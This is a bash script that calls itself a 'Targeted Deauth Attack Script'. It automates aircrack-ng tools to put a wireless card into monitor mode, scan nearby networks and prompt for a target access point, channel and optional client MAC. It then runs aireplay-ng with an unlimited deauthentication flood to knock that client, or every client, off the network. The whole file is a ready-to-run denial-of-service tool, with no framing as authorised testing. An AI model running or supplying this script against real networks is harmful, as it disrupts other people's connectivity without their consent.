#!/bin/bash

# Colors for better visibility
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Check if script is run as root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}Please run as root${NC}"
    exit
fi

# Function to cleanup on exit
cleanup() {
    echo -e "\n${YELLOW}Cleaning up...${NC}"
    airmon-ng stop ${monitor_interface} > /dev/null 2>&1
    exit
}

# Set cleanup on script exit
trap cleanup EXIT

# Print banner
echo -e "${GREEN}=== Targeted Deauth Attack Script ===${NC}"

# List available wireless interfaces
echo -e "\n${YELLOW}Available wireless interfaces:${NC}"
airmon-ng | grep -E "^[a-zA-Z0-9]"

# Get wireless interface from user
read -p "Enter your wireless interface (e.g., wlan0): " interface

# Start monitor mode
echo -e "\n${YELLOW}Starting monitor mode...${NC}"
airmon-ng check kill > /dev/null 2>&1
monitor_interface=$(airmon-ng start $interface | grep "mac80211 monitor mode" | awk '{print $5}')

if [ -z "$monitor_interface" ]; then
    monitor_interface="${interface}mon"
fi

echo -e "${GREEN}Monitor interface: $monitor_interface${NC}"

# Scan for networks
echo -e "\n${YELLOW}Scanning for networks... (Press Ctrl+C to stop scan)${NC}"
xterm -e "airodump-ng $monitor_interface" &
dump_pid=$!

# Wait for user to select target
read -p "Enter target BSSID: " bssid
read -p "Enter target channel: " channel
read -p "Enter target client MAC (leave empty for broadcast): " client_mac

# Kill the scanning process
kill $dump_pid 2>/dev/null

# Set channel
iwconfig $monitor_interface channel $channel

# Start the attack
echo -e "\n${GREEN}Starting deauth attack...${NC}"
if [ -z "$client_mac" ]; then
    # Broadcast deauth
    aireplay-ng --deauth 0 -a $bssid $monitor_interface
else
    # Targeted deauth
    aireplay-ng --deauth 0 -a $bssid -c $client_mac $monitor_interface
fi
